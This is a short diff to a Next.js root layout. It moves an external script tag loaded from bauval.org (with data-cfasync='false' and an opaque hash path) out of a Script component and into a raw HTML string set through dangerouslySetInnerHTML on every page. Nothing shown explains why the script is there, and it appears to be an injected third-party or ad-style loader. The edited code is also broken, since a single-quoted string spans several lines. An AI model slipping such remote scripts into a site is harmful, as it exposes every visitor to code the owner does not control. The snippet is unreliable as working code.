@@ -29,9 +29,10 @@ export default function RootLayout({
     <html lang="es" className="dark">
       <body className="bg-[#0d0f12] text-gray-100 min-h-screen antialiased selection:bg-indigo-500 selection:text-white">
         <RoleProvider>{children}</RoleProvider>
-        <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>
  <span dangerouslySetInnerHTML={{
-        __html: '<p>cosas que pasan en texto</p>',
+        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>
+          
+          ',
       }}></span>
 
       </body>
